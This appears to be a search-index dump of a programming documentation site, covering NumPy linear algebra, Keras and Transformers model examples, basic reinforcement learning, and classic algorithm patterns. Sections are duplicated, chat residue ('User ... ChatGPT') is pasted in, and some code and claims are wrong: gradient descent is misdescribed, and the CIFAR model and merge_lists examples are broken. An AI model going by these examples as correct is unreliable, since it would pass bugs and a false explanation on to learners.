of Matrix:\\n\", trace)\n</code></pre>"},{"location":"programming/ai/#determinant-of-a-matrix","title":"Determinant of a Matrix","text":"<p>The determinant is a special number that can be calculated from a square matrix. It provides important information about the matrix and can be used to solve systems of equations, to find the inverse of a matrix, and to describe the geometric transformations caused by the matrix.</p> <p>In Python, you can compute the determinant of a matrix using the <code>numpy.linalg.det()</code> function:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2], [3, 4]])\n\n# Compute the determinant of the matrix\ndet = np.linalg.det(m)\nprint(\"Determinant of Matrix:\\n\", det)\n</code></pre>"},{"location":"programming/ai/#matrix-transpose","title":"Matrix Transpose","text":"<p>Transposing a matrix is the process of swapping the row and column indices of each element, essentially reflecting the elements across the main diagonal. It's a fundamental operation in linear algebra and finds many uses in computations related to machine learning.</p> <p>In Python, you can compute the transpose of a matrix using the <code>numpy.transpose()</code> function or <code>T</code> attribute:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2, 3], [4, 5, 6]])\n\n# Compute the transpose of the matrix\nm_t = np.transpose(m)\n# or\nm_t = m.T\nprint(\"Transpose of Matrix:\\n\", m_t)\n</code></pre>"},{"location":"programming/ai/#introduction-to-linear-transformations","title":"Introduction to Linear Transformations","text":"<p>Linear transformations are a cornerstone of linear algebra. They are functions that map one vector space to another, preserving the operations of vector addition and scalar multiplication. In the context of machine learning, linear transformations are often used for feature scaling, dimensionality reduction, etc.</p> <p>For instance, let's scale a vector by a factor of 2 and rotate it by 90 degrees:</p> <pre><code>import numpy as np\n\n# Define a vector\nv = np.array([1, 0])\n\n# Scaling transformation\nscale_factor = 2\nv_scaled = scale_factor * v\nprint(\"Scaled Vector:\\n\", v_scaled)\n\n# Rotation transformation\ntheta = np.radians(90)  # convert degrees to radians\nrotation_matrix = np.array([[np.cos(theta), -np.sin(theta)], \n                            [np.sin(theta),  np.cos(theta)]])  # rotation matrix\nv_rotated = np.dot(rotation_matrix, v)\nprint(\"Rotated Vector:\\n\", v_rotated)\n</code></pre>"},{"location":"programming/ai/#matrix-factorization","title":"Matrix Factorization","text":"<p>Matrix Factorization techniques are usually a step in dimensionality reduction or latent semantic analysis. They are essential in recommendation systems, where they are used to predict user interaction with items.</p> <p>For example, Singular Value Decomposition (SVD) is a type of matrix factorization. In Python, you can use the <code>numpy.linalg.svd()</code> function to factorize a matrix:</p> <pre><code>import numpy as np\n\n# Define a matrix\nm = np.array([[1, 2], [3, 4], [5, 6]])\n\n# Compute the Singular Value Decomposition\nU, S, VT = np.linalg.svd(m)\nprint(\"U:\\n\", U)\nprint(\"S:\\n\", S)\nprint(\"VT:\\n\", VT)\n</code></pre>"},{"location":"programming/ai/#tensors-in-deep-learning","title":"Tensors in Deep Learning","text":"<p>A tensor is a container that can house data in N dimensions. They are a generalization of matrices. In the context of tensors, dimensions are often called \"axes.\"</p> <p>In deep learning, we use tensors pretty much exclusively, as they are a primary data structure that you'll work with as inputs, outputs, and transformations.</p> <p>In Python, using libraries such as TensorFlow or PyTorch, you can create and manipulate tensors:</p> <pre><code>import tensorflow as tf\n\n# Create a tensor\nt = tf.constant([[1, 2, 3], [4, 5, 6], [7, 8, 9]], dtype=tf.float32)\n\n# Multiply tensors\nresult = tf.multiply(t, t)\nprint(\"Tensor multiplication:\\n\", result)\n\n# Reduce_sum\nresult = tf.reduce_sum(t)\nprint(\"Tensor reduce_sum:\\n\", result)\n\n# Expand dimensions\nexpanded = tf.expand_dims(t, axis=1)\nprint(\"Expanded tensor shape:\\n\", expanded.shape)\n</code></pre>"},{"location":"programming/ai/#activation-functions","title":"Activation Functions","text":"<p>In an artificial neural network, an activation function defines the output of a neuron given an input or set of inputs. Activation functions are vital for a neural network to learn and make sense of something really complicated.</p> <p>Commonly used activation functions include:</p> <ul> <li> <p>Sigmoid: This activation function squashes values into a range between 0 and 1. It is especially useful for models where we have to predict the probability as an output.</p> </li> <li> <p>Tanh: The hyperbolic tangent function is similar to the sigmoid but squashes values between -1 and 1.</p> </li> <li> <p>ReLU: The Rectified Linear Unit is the most widely used activation function. It gives an output x if x is positive and 0 otherwise.</p> </li> </ul> <pre><code># An example of using different activation functions in a neural network\nfrom tensorflow.keras.layers import Activation\n\nmodel = Sequential()\n\n# Using ReLU\nmodel.add(Dense(64))\nmodel.add(Activation('relu'))\n\n# Using sigmoid\nmodel.add(Dense(64))\nmodel.add(Activation('sigmoid'))\n\n# Using tanh\nmodel.add(Dense(64))\nmodel.add(Activation('tanh'))\n</code></pre>"},{"location":"programming/ai/#cost-functions","title":"Cost Functions","text":"<p>A cost function, also known as a loss function, measures how well the neural network predictions match the actual values. During training, the neural network aims to minimize this cost function.</p> <p>Commonly used cost functions include Mean Squared Error for regression tasks and Cross Entropy Loss for classification tasks.</p> <pre><code># An example of compiling a model with a cost function\nfrom tensorflow.keras.losses import BinaryCrossentropy\n\nmodel.compile(loss=BinaryCrossentropy(from_logits=True), optimizer='adam')\n</code></pre>"},{"location":"programming/ai/#gradient-descent-and-optimizers","title":"Gradient Descent and Optimizers","text":"<p>Gradient descent is an optimization algorithm used to minimize the cost function. It works by iteratively adjusting the parameters (weights) of the model in the direction that minimally increases the cost function.</p> <p>In practice, variations of gradient descent such as Stochastic Gradient Descent (SGD), RMSprop, or Adam are commonly used.</p> <pre><code># An example of compiling a model with Adam optimizer\nfrom tensorflow.keras.optimizers import Adam\n\nmodel.compile(loss='binary_crossentropy', optimizer=Adam(), metrics=['accuracy'])\n</code></pre>"},{"location":"programming/ai/#overfitting-underfitting-and-regularization","title":"Overfitting, Underfitting and Regularization","text":"<p>In machine learning, overfitting occurs when a model learns the detail and noise in the training data to the extent that it performs poorly on new, unseen data. Underfitting, on the other hand, occurs when a model is too simple to learn the underlying structure of the data.</p> <p>Regularization techniques are used to prevent overfitting. This includes methods like L1 and L2 regularization and dropout.</p> <pre><code># An example of using dropout regularization\nfrom tensorflow.keras.layers import Dropout\n\nmodel = Sequential()\n\nmodel.add(Dense(64, activation='relu'))\nmodel.add(Dropout(0.5))\nmodel.add(Dense(1, activation='sigmoid'))\n</code></pre>"},{"location":"programming/ai/#practical-example-building-a-deep-neural-network-for-image-classification","title":"Practical Example: Building a Deep Neural Network for Image Classification","text":"<p>Let's implement a deep neural network for classifying images from the CIFAR-10 dataset. This dataset contains 60,000 32x32 color images in 10 different classes.</p> <pre><code># Import necessary libraries\nfrom tensorflow.keras.datasets import cifar10\nfrom tensorflow.keras.utils import to_categorical\n\n# Load data\n(x_train, y_train), (x_test, y_test) = cifar10.load_data()\n\n# Normalize pixel values to be between 0 and 1\nx_train, x_test = x_train / 255.0, x_test / 255.0\n\n# Convert class vectors to binary class matrices\ny_train = to_categorical(y_train, 10)\ny_test = to_categorical(y_test, 10)\n\n# Define the model architecture\nmodel = Sequential()\nmodel.add(Dense(512, activation='relu', input_shape=(32, 32, 3)))\nmodel.add(Dense(10, activation='softmax'))\n\n# Compile the model\nmodel.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])\n\n# Train the model\nmodel.fit(x_train, y_train, batch_size=32, epochs=10, validation_data=(x_test, y_test))\n\n# Evaluate the model\nscore = model.evaluate(x_test, y_test, verbose=0)\nprint('Test loss:', score[0])\nprint('Test accuracy:', score[1])\n</code></pre>"},{"location":"programming/ai/#advanced-neural-networks","title":"Advanced Neural Networks","text":"<p>With the foundation of neural networks covered, we can now delve into more advanced architectures. Let's look at Convolutional Neural Networks and Recurrent Neural Networks in detail.</p>"},{"location":"programming/ai/#convolutional-neural-networks-cnn_1","title":"Convolutional Neural Networks (CNN)","text":"<p>CNNs are primarily used for image processing, pattern recognition, and image classification. They are designed to automatically and adaptively learn spatial hierarchies of features from tasks with grid-like topology.</p> <p>A CNN consists of an input and an output layer, as well as multiple hidden layers. The hidden layers of a CNN typically consist of convolutional layers, pooling layers, fully connected layers, and normalization layers.</p> <p>Here is a simple example of a CNN architecture using Keras:</p> <pre><code>from tensorflow.keras.layers import Conv2D, MaxPooling2D, Flatten\n\nmodel = Sequential()\n\n# The first convolution layer\nmodel.add(Conv2D(32, (3, 3), activation='relu', input_shape=(64, 64, 3)))\n\n# The first pooling layer\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\n\n# The second convolution layer\nmodel.add(Conv2D(64, (3, 3), activation='relu'))\n\n# The second pooling layer\nmodel.add(MaxPooling2D(pool_size=(2, 2)))\n\n# Flattening the 2D arrays for fully connected layers\nmodel.add(Flatten())\n\nmodel.add(Dense(64, activation='relu'))\n\n# The output layer\nmodel.add(Dense(1, activation='sigmoid'))\n</code></pre>"},{"location":"programming/ai/#recurrent-neural-networks-rnn_1","title":"Recurrent Neural Networks (RNN)","text":"<p>RNNs are a type of artificial neural network designed to recognize patterns in sequences of data, such as text, genomes, handwriting, or the spoken word. They are called recurrent because they perform the same task for every element of a sequence, with the output depending on the previous computations.</p> <p>One of the appeals of RNNs is the idea that they might be able to connect previous information to the present task. If you want to predict the next word in a sentence you better know which words came before it.</p> <pre><code>from tensorflow.keras.layers import SimpleRNN\n\nmodel = Sequential()\n\nmodel.add(SimpleRNN(32, return_sequences=True, input_shape=(100,1)))\nmodel.add(SimpleRNN(32))\nmodel.add(Dense(1, activation='sigmoid'))\n\nmodel.compile(optimizer='rmsprop', loss='binary_crossentropy', metrics=['acc'])\n</code></pre>"},{"location":"programming/ai/#long-short-term-memory-lstm_1","title":"Long Short-Term Memory (LSTM)","text":"<p>LSTM is a special kind of RNN capable of learning long-term dependencies. They work tremendously well on a large variety of problems, and are now widely used. LSTM networks are well-suited to classifying, processing and making predictions based on time series data.</p> <pre><code>from tensorflow.keras.layers import LSTM\n\nmodel = Sequential()\n\nmodel.add(LSTM(32, return_sequences=True, input_shape=(100,1)))\nmodel.add(LSTM(32))\nmodel.add(Dense(1, activation='sigmoid'))\n\nmodel.compile(optimizer='rmsprop', loss='binary_crossentropy', metrics=['acc'])\n</code></pre>"},{"location":"programming/ai/#specific-deep-learning-architectures_1","title":"Specific Deep Learning Architectures","text":"<p>Deep learning has led to the development of a variety of innovative neural network architectures that are tailored to different types of tasks. Let's delve deeper into these architectures and understand their mechanics.</p>"},{"location":"programming/ai/#cnn-architectures_1","title":"CNN Architectures","text":"<p>Convolutional Neural Networks (CNNs) have been at the forefront of many breakthroughs in the field of computer vision. Different CNN architectures have been proposed over the years. </p>"},{"location":"programming/ai/#resnet-residual-network_1","title":"ResNet (Residual Network)","text":"<p>Introduced by Microsoft, the ResNet architecture is unique due to its \"skip connection\" feature. This allows the model to have a large number of layers (even over 100) without suffering from the vanishing gradient problem.</p> <pre><code>from tensorflow.keras.applications import ResNet50\n\n# Initialize a ResNet50 model with pre-trained weights\nmodel = ResNet50(weights='imagenet')\n\n# If you want to customize\nbase_model = ResNet50(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#vgg-visual-geometry-group_1","title":"VGG (Visual Geometry Group)","text":"<p>The VGG architecture, developed by the Visual Geometry Group at Oxford, stands out due to its uniformity. It is simple, and great at generalization, but can be resource-heavy.</p> <pre><code>from tensorflow.keras.applications import VGG16\n\n# Initialize a VGG16 model with pre-trained weights\nmodel = VGG16(weights='imagenet')\n\n# If you want to customize\nbase_model = VGG16(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#inception_1","title":"Inception","text":"<p>Inception, also known as GoogLeNet, was developed by researchers at Google. The inception module, a unique building block of this architecture, allows for more efficient computation and deeper networks.</p> <pre><code>from tensorflow.keras.applications import InceptionV3\n\n# Initialize an InceptionV3 model with pre-trained weights\nmodel = InceptionV3(weights='imagenet')\n\n# If you want to customize\nbase_model = InceptionV3(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#transformer-model_2","title":"Transformer Model","text":"<p>The Transformer model is primarily used in the field of natural language processing (NLP). Unlike traditional recurrent neural networks, Transformer models use only attention mechanisms to handle variable-length input, making computation more parallelizable.</p> <p>The most famous implementation of the Transformer model is probably the BERT (Bidirectional Encoder Representations from Transformers) model by Google.</p> <pre><code>from transformers import BertModel, BertTokenizer\n\n# Load pre-trained model and tokenizer\nmodel = BertModel.from_pretrained('bert-base-uncased')\ntokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\n</code></pre>"},{"location":"programming/ai/#generative-adversarial-networks-gans_1","title":"Generative Adversarial Networks (GANs)","text":"<p>Generative Adversarial Networks (GANs) involve two neural networks competing against each other in unsupervised machine learning tasks. GANs can generate new data that mimics the patterns of the training set. </p> <p>Let's look at an example of implementing a simple GAN architecture:</p> <pre><code>from tensorflow.keras.layers import Input\nfrom tensorflow.keras.models import Model\n\n# The generator network\ng_input = Input(shape=[100])\nG = model_generator(g_input)\nG.summary()\n\n# The discriminator network\nd_input = Input(shape=[28, 28, 1])\nD = model_discriminator(d_input)\nD.summary()\n\n# The GAN\nGAN = Model(g_input, D(G(g_input)))\nGAN.summary()\n</code></pre> <p>This code creates a simple GAN using Keras' functional API. The generator network <code>G</code> takes random noise as input and generates an image, while the discriminator network <code>D</code> takes an image (real or generated) as input and outputs a probability indicating how \"real\" the image is. The GAN model <code>GAN</code> chains the generator and the discriminator together: given random noise, it outputs the discriminator's assessment of the realism of the generated image.</p> <p>Each of the architectures mentioned above has played a significant role in driving advancements in tasks such as image recognition, object detection, and language understanding. By delving deeper into these architectures, you will better understand their mechanics and learn how to leverage them in your own projects.</p>"},{"location":"programming/ai/#specific-deep-learning-architectures_2","title":"Specific Deep Learning Architectures","text":"<p>Deep learning has led to the development of a variety of innovative neural network architectures that are tailored to different types of tasks. Let's delve deeper into these architectures and understand their mechanics.</p>"},{"location":"programming/ai/#cnn-architectures_2","title":"CNN Architectures","text":"<p>Convolutional Neural Networks (CNNs) have been at the forefront of many breakthroughs in the field of computer vision. Different CNN architectures have been proposed over the years. </p>"},{"location":"programming/ai/#resnet-residual-network_2","title":"ResNet (Residual Network)","text":"<p>Introduced by Microsoft, the ResNet architecture is unique due to its \"skip connection\" feature. This allows the model to have a large number of layers (even over 100) without suffering from the vanishing gradient problem.</p> <pre><code>from tensorflow.keras.applications import ResNet50\n\n# Initialize a ResNet50 model with pre-trained weights\nmodel = ResNet50(weights='imagenet')\n\n# If you want to customize\nbase_model = ResNet50(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#vgg-visual-geometry-group_2","title":"VGG (Visual Geometry Group)","text":"<p>The VGG architecture, developed by the Visual Geometry Group at Oxford, stands out due to its uniformity. It is simple, and great at generalization, but can be resource-heavy.</p> <pre><code>from tensorflow.keras.applications import VGG16\n\n# Initialize a VGG16 model with pre-trained weights\nmodel = VGG16(weights='imagenet')\n\n# If you want to customize\nbase_model = VGG16(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#inception_2","title":"Inception","text":"<p>Inception, also known as GoogLeNet, was developed by researchers at Google. The inception module, a unique building block of this architecture, allows for more efficient computation and deeper networks.</p> <pre><code>from tensorflow.keras.applications import InceptionV3\n\n# Initialize an InceptionV3 model with pre-trained weights\nmodel = InceptionV3(weights='imagenet')\n\n# If you want to customize\nbase_model = InceptionV3(weights='imagenet', include_top=False)\n</code></pre>"},{"location":"programming/ai/#transformer-model_3","title":"Transformer Model","text":"<p>The Transformer model is primarily used in the field of natural language processing (NLP). Unlike traditional recurrent neural networks, Transformer models use only attention mechanisms to handle variable-length input, making computation more parallelizable.</p> <p>The most famous implementation of the Transformer model is probably the BERT (Bidirectional Encoder Representations from Transformers) model by Google.</p> <pre><code>from transformers import BertModel, BertTokenizer\n\n# Load pre-trained model and tokenizer\nmodel = BertModel.from_pretrained('bert-base-uncased')\ntokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\n</code></pre>"},{"location":"programming/ai/#generative-adversarial-networks-gans_2","title":"Generative Adversarial Networks (GANs)","text":"<p>Generative Adversarial Networks (GANs) involve two neural networks competing against each other in unsupervised machine learning tasks. GANs can generate new data that mimics the patterns of the training set. </p> <p>Let's look at an example of implementing a simple GAN architecture:</p> <pre><code>from tensorflow.keras.layers import Input\nfrom tensorflow.keras.models import Model\n\n# The generator network\ng_input = Input(shape=[100])\nG = model_generator(g_input)\nG.summary()\n\n# The discriminator network\nd_input = Input(shape=[28, 28, 1])\nD = model_discriminator(d_input)\nD.summary()\n\n# The GAN\nGAN = Model(g_input, D(G(g_input)))\nGAN.summary()\n</code></pre> <p>This code creates a simple GAN using Keras' functional API. The generator network <code>G</code> takes random noise as input and generates an image, while the discriminator network <code>D</code> takes an image (real or generated) as input and outputs a probability indicating how \"real\" the image is. The GAN model <code>GAN</code> chains the generator and the discriminator together: given random noise, it outputs the discriminator's assessment of the realism of the generated image.</p> <p>Each of the architectures mentioned above has played a significant role in driving advancements in tasks such as image recognition, object detection, and language understanding. By delving deeper into these architectures, you will better understand their mechanics and learn how to leverage them in your own projects.</p> <p>User \u10ea\u10dd\u10dc\u10e2\u10d8\u10dc\u10e3\u10d4 ChatGPT</p> <p>vbnet</p>"},{"location":"programming/ai/#transformer-model-continued","title":"Transformer Model - Continued","text":"<p>One of the main innovations of the Transformer model is the self-attention mechanism. Self-attention, sometimes called intra-attention, is an attention mechanism relating different positions of a single sequence in order to compute a representation of the sequence. In simple terms, self-attention allows the model to consider other words in the sentence when processing a word.</p> <p>To illustrate this, let's delve a bit more into the BERT (Bidirectional Encoder Representations from Transformers) model. BERT has brought about a revolution in the way we approach NLP tasks. Its bidirectional training, which is essentially a read of the entire sentence rather than word-by-word, makes it stand out.</p> <pre><code>from transformers import BertForSequenceClassification, AdamW\n\n# Assume we're training on a binary classification problem\nmodel = BertForSequenceClassification.from_pretrained(\n    \"bert-base-uncased\", # Use the 12-layer BERT model, with an uncased vocab.\n    num_labels = 2, # The number of output labels--2 for binary classification.\n)\n\n# AdamW is a class from the huggingface library, it is the optimizer we're using\noptimizer = AdamW(model.parameters(), lr = 2e-5)\n</code></pre> <p>In this example, we use the BERT model for a simple binary classification task. We initialize the model with pre-trained weights and then specify that we're dealing with a binary classification problem (thus, <code>num_labels = 2</code>).</p>"},{"location":"programming/ai/#generative-adversarial-networks-gans-continued","title":"Generative Adversarial Networks (GANs) - Continued","text":"<p>Let's now take a look at a specific GAN architecture, the DCGAN (Deep Convolutional GAN). DCGAN applies convolutional neural networks to the GAN architecture, which is particularly successful in generating high-quality images.</p> <pre><code>from tensorflow.keras.layers import Reshape, Conv2DTranspose\n\n# Generator in DCGAN\nmodel = Sequential()\nmodel.add(Dense(7 * 7 * 128, input_dim=100))\nmodel.add(LeakyReLU(0.2))\nmodel.add(Reshape((7, 7, 128)))\nmodel.add(Conv2DTranspose(64, (5, 5), strides=(2, 2), padding='same'))\nmodel.add(LeakyReLU(0.2))\nmodel.add(Conv2DTranspose(1, (5, 5), strides=(2, 2), padding='same', activation='tanh'))\n</code></pre> <p>In this example, the generator network starts with a dense layer that reshapes its input into a 7x7x128 tensor. It then uses two <code>Conv2DTranspose</code> layers (a type of layer that performs up-convolution) to upscale this tensor into a 28x28x1 image. This network uses <code>LeakyReLU</code> activation functions and outputs images with pixel values in the range [-1, 1] (as indicated by the <code>tanh</code> activation function).</p>"},{"location":"programming/ai/#basics-of-nlp-and-text-representation-techniques-continued","title":"Basics of NLP and Text Representation Techniques - Continued","text":"<p>To better understand the techniques used to represent text data, let's look at some Python code examples:</p>"},{"location":"programming/ai/#bag-of-words_1","title":"Bag of Words","text":"<pre><code>from sklearn.feature_extraction.text import CountVectorizer\n\n# Initialize the CountVectorizer\nvectorizer = CountVectorizer()\n\n# Corpus of data\ncorpus = ['This is the first document.',\n          'This document is the second document.',\n          'And this is the third one.',\n          'Is this the first document?']\n\n# Fit and transform the corpus\nX = vectorizer.fit_transform(corpus)\n\n# Convert to array and print the result\nprint(X.toarray())\n</code></pre> <p>In this example, we use the <code>CountVectorizer</code> class from the <code>sklearn.feature_extraction.text</code> module, which implements the Bag of Words method. The <code>fit_transform</code> function learns the vocabulary dictionary and returns a Document-Term matrix.</p>"},{"location":"programming/ai/#tf-idf_1","title":"TF-IDF","text":"<pre><code>from sklearn.feature_extraction.text import TfidfVectorizer\n\n# Initialize the TfidfVectorizer\nvectorizer = TfidfVectorizer()\n\n# Fit and transform the corpus\nX = vectorizer.fit_transform(corpus)\n\n# Convert to array and print the result\nprint(X.toarray())\n</code></pre> <p>Here, we use the <code>TfidfVectorizer</code> class, also from the <code>sklearn.feature_extraction.text</code> module. It converts a collection of raw documents to a matrix of TF-IDF features.</p>"},{"location":"programming/ai/#word-embeddings_1","title":"Word Embeddings","text":"<p>For word embeddings, we often use pre-trained models. One of the most common is Word2Vec, trained on a large corpus of text. Gensim is a popular library for using Word2Vec in Python.</p> <pre><code>from gensim.models import Word2Vec\n\n# Assuming that 'sentences' is a list of lists of tokens \n# For example: sentences = [['this', 'is', 'the', 'first', 'sentence', 'for', 'word2vec'],\n#                           ['this', 'is', 'the', 'second', 'sentence']]\n\n# Train a Word2Vec model\nmodel = Word2Vec(sentences, min_count=1)\n\n# Get the vector for a word\nprint(model.wv['sentence'])\n</code></pre> <p>This script trains a Word2Vec model on a small corpus and prints the vector for the word 'sentence'.</p>"},{"location":"programming/ai/#advanced-nlp-models-and-techniques-continued","title":"Advanced NLP Models and Techniques - Continued","text":""},{"location":"programming/ai/#rnns-and-lstms-in-nlp","title":"RNNs and LSTMs in NLP","text":"<p>RNNs are particularly suitable for handling sequence data. Let's look at an example of an LSTM for text generation:</p> <pre><code>from tensorflow.keras.models import Sequential\nfrom tensorflow.keras.layers import Dense, LSTM\nfrom tensorflow.keras.optimizers import RMSprop\n\n# Assume that 'maxlen' is the sequence length, 'chars' is the list of unique characters, and 'char_indices' and 'indices_char' are dictionaries mapping characters to their indices and vice versa\nmodel = Sequential()\nmodel.add(LSTM(128, input_shape=(maxlen, len(chars))))\nmodel.add(Dense(len(chars), activation='softmax'))\n\noptimizer = RMSprop(learning_rate=0.01)\nmodel.compile(loss='categorical_crossentropy', optimizer=optimizer)\n</code></pre> <p>This script creates an LSTM model for text generation. It assumes that you've already preprocessed the text into sequences of characters and created mappings of characters to numeric indices.</p>"},{"location":"programming/ai/#using-transformers-in-nlp","title":"Using Transformers in NLP","text":"<p>As discussed before, the transformer model, specifically BERT and GPT, has been very effective in various NLP tasks. For example, we can use the BERT model for text classification as follows:</p> <pre><code>from transformers import BertForSequenceClassification, AdamW\n\nmodel = BertForSequenceClassification.from_pretrained(\n    \"bert-base-uncased\",\n    num_labels=2,\n)\noptimizer = AdamW(model.parameters(), lr=2e-5)\n</code></pre> <p>This script loads a pre-trained BERT model for a binary classification task. It uses the AdamW optimizer with a learning rate of 2e-5.</p>"},{"location":"programming/ai/#reinforcement-learning_1","title":"Reinforcement Learning","text":"<p>Reinforcement Learning (RL) is another significant area of Machine Learning where an agent learns to behave in an environment, by performing certain actions and observing the rewards/results which it gets from those actions.</p>"},{"location":"programming/ai/#basics-of-reinforcement-learning","title":"Basics of Reinforcement Learning","text":"<p>The key components of Reinforcement Learning are as follows:</p> <ul> <li> <p>Environment: This is the world through which the agent moves. The environment takes the agent's current state and action as input, and returns the agent's reward and next state.</p> </li> <li> <p>Agent: This is the algorithm that learns from trial and error.</p> </li> <li> <p>State: This is the current situation of the agent.</p> </li> <li> <p>Action: What the agent can do.</p> </li> <li> <p>Reward: Feedback from the environment.</p> </li> </ul> <p>Here is a simple example of an RL implementation using Python and the <code>gym</code> library, which is a popular toolkit for developing and comparing RL algorithms:</p> <pre><code>import gym\n\n# Create the CartPole game environment\nenv = gym.make(\"CartPole-v1\")\n\n# Number of episodes\nfor i_episode in range(20):\n    # Reset state\n    state = env.reset()\n    for t in range(100):\n        env.render()\n        # Take a random action\n        action = env.action_space.sample()\n        state, reward, done, info = env.step(action)\n        if done:\n            print(\"Episode finished after {} timesteps\".format(t+1))\n            break\nenv.close()\n</code></pre> <p>In this example, we're using a simple game environment called \"CartPole-v1\". The agent takes random actions in the environment and receives feedback.</p> <p>(Note: More advanced topics on reinforcement learning will be continued...)</p>"},{"location":"programming/ai/#deep-reinforcement-learning","title":"Deep Reinforcement Learning","text":"<p>Deep Reinforcement Learning (DRL) combines neural networks with reinforcement learning. The neural network takes in observations, processes them, and outputs actions to take. These actions are then used in the reinforcement learning component.</p>"},{"location":"programming/ai/#q-learning","title":"Q-Learning","text":"<p>Q-Learning is a values based algorithm in reinforcement learning. Value based algorithms update the value function based on the Bellman Equation. The algorithm helps the agent to decide what action to take under what circumstances.</p>"},{"location":"programming/ai/#deep-q-networks","title":"Deep Q-Networks","text":"<p>Deep Q-Networks (DQN) is the combination of Q-Learning and Deep Learning. In DQN, we use a neural network to approximate the Q-value function, and the network is trained to output the maximum expected future rewards for each action, given a specific state.</p>"},{"location":"programming/ai/#policy-gradients","title":"Policy Gradients","text":"<p>Policy Gradients (PG) are a type of reinforcement learning algorithm that directly optimizes the policy\u2014the function that decides what actions to take\u2014by estimating the gradient of the expected rewards.</p>"},{"location":"programming/algorithms/","title":"Advanced Programming Algorithms","text":""},{"location":"programming/algorithms/#1-sliding-window","title":"1. Sliding Window","text":"<p>The sliding window is a technique that involves creating a \"window\" in your data and then \"sliding\" it in a certain direction to perform operations on the data within the window.</p> <p>Here's a Python example of finding the maximum sum of a subarray of size <code>k</code> in an array:</p> <p><pre><code>def max_sub_array_of_size_k(k, arr):\n    max_sum , window_sum = 0, 0\n    window_start = 0\n\n    for window_end in range(len(arr)):\n        window_sum += arr[window_end]  # add the next element\n\n        # slide the window, we don't need to slide if we've not hit the required window size of 'k'\n        if window_end &gt;= k-1:\n            max_sum = max(max_sum, window_sum)\n            window_sum -= arr[window_start]  # subtract the element going out\n            window_start += 1  # slide the window ahead\n\n    return max_sum\n</code></pre> Real world example: Sliding window algorithms can be used in data stream processing to calculate rolling metrics, such as a moving average.</p>"},{"location":"programming/algorithms/#2-two-pointers","title":"2. Two Pointers","text":"<p>Two Pointers is a pattern where two pointers iterate through the data structure in tandem until one or both of the pointers meet a certain condition.</p> <p>Python example for reversing a string:</p> <pre><code>def reverse_string(s):\n    left, right = 0, len(s) - 1\n    while left &lt; right:\n        # Swap s[left] and s[right]\n        s[left], s[right] = s[right], s[left]\n        left, right = left + 1, right - 1\n    return s\n</code></pre> <p>Real world example: Two pointers can be used in situations where you have to find pairs of elements that meet a certain condition, like in a music playlist to match songs of certain lengths together.</p>"},{"location":"programming/algorithms/#3-binary-search","title":"3. Binary Search","text":"<p>Binary Search is a divide and conquer algorithm used to find a specific item in a sorted array.</p> <p>Python example:</p> <p><pre><code>def binary_search(arr, target):\n    left, right = 0, len(arr) - 1\n    while left &lt;= right:\n        mid = left + (right - left) // 2\n        if arr[mid] == target:\n            return mid  # target found\n        if arr[mid] &lt; target:\n            left = mid + 1  # search in the right half\n        else:\n            right = mid - 1  # search in the left half\n    return -1  # target not found\n</code></pre> Real world example: Binary search is used in debugging (e.g., git bisect) to find faulty code commit. </p>"},{"location":"programming/algorithms/#4-fast-and-slow-pointers","title":"4. Fast and Slow Pointers","text":"<p>The Fast and Slow pointer approach, also known as the Hare and Tortoise algorithm, is used to determine if a linked list is a circular linked list.</p> <p>Python example:</p> <p><pre><code>class Node:\n    def __init__(self, value, next=None):\n        self.value = value\n        self.next = next\n\ndef has_cycle(head):\n    slow, fast = head, head\n    while fast is not None and fast.next is not None:\n        fast = fast.next.next\n        slow = slow.next\n        if slow == fast:\n            return True  # found the cycle\n    return False\n</code></pre> Real world example: This algorithm can be used to detect cycles in a computer network.</p>"},{"location":"programming/algorithms/#5-merge-intervals","title":"5. Merge Intervals","text":"<p>Merge Intervals is a problem where given a collection of intervals, we need to merge all overlapping intervals.</p> <p>Python example:</p> <p><pre><code>def merge(intervals):\n    if len(intervals) &lt; 2:\n        return intervals\n\n    # sort the intervals on the start time\n    intervals.sort(key=lambda x: x[0])\n\n    mergedIntervals = []\n    start = intervals[0][0]\n    end = intervals[0][1]\n    for i in range(1, len(intervals)):\n        if intervals[i][0] &lt;= end:  # overlapping intervals\n            end = max(end, intervals[i][1])  # adjust the 'end'\n        else:  # non-overlapping interval\n            mergedIntervals.append([start, end])\n            start = intervals[i][0]\n            end = intervals[i][1]\n\n    # add the last interval\n    mergedIntervals.append([start, end])\n    return mergedIntervals\n</code></pre> Real world example: In calendar systems, to find free or busy time slots, we need to merge all overlapping intervals.</p>"},{"location":"programming/algorithms/#6-top-k-elements","title":"6. Top K Elements","text":"<p>To find the top 'K' elements among a given set. This pattern can be easily recognized from questions such as \"find the top K numbers\" or \"find the most frequent K numbers\".</p> <p>Python example:</p> <p><pre><code>import heapq\n\ndef find_k_largest_numbers(nums, k):\n    minHeap = []\n    # put first 'K' numbers in the min heap\n    for i in range(k):\n        heapq.heappush(minHeap, nums[i])\n\n    # go through the remaining numbers of the array, if the number from the array is bigger than the\n    # top(smallest) number of the min-heap, remove the top number from heap and add the number from array\n    for i in range(k, len(nums)):\n        if nums[i] &gt; minHeap[0]:\n            heapq.heappop(minHeap)\n            heapq.heappush(minHeap, nums[i])\n\n    # the heap has the top 'K' numbers, return them in a list\n    return list(minHeap)\n</code></pre> Real world example: Top K elements can be used in real-time online voting results, showing only top K candidates.</p>"},{"location":"programming/algorithms/#7-k-way-merge","title":"7. K-way Merge","text":"<p>K-way merge pattern is an efficient way to merge data from multiple sources. The pattern works by comparing the smallest elements of each source and repeatedly choosing the smallest until there are no more elements left.</p> <p>Python example (Merging K Sorted Lists):</p> <p><pre><code>import heapq\nfrom typing import List\n\nclass ListNode:\n    def __init__(self, value, next=None):\n        self.value = value\n        self.next = next\n\ndef merge_lists(lists: List[ListNode]) -&gt; ListNode:\n    min_heap = []\n\n    # put the root of each list in the min heap\n    for root in lists:\n        if root is not None:\n            heapq.heappush(min_heap, (root.val, root))\n\n    # take the smallest (top) element from the 